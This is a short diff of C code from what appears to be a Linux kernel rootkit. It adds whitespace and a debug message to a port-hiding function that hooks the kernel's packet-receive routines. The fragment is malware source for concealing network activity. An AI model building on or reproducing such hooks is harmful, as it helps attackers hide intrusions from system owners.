@@ -19,8 +19,10 @@ int (*tpacket_rcv)(struct sk_buff*, struct net_device*, struct packet_type*, str
 /* spinlocks for each function we hook */
 spinlock_t packet_rcv_lock;
 unsigned long packet_rcv_flags;
+
 spinlock_t tpacket_rcv_lock;
 unsigned long tpacket_rcv_flags;
+
 spinlock_t packet_rcv_spkt_lock;
 unsigned long packet_rcv_spkt_flags;
 
@@ -58,6 +60,8 @@ is_port_hidden (struct sk_buff *skb)
 				
 				return 1;
 			}
+			
+			ROOTKIT_DEBUG("Unfiltered TCP packet detected. Src: %u Dest: %u\n", tcp_header->source, tcp_header->dest);
 		}
 		
 	}
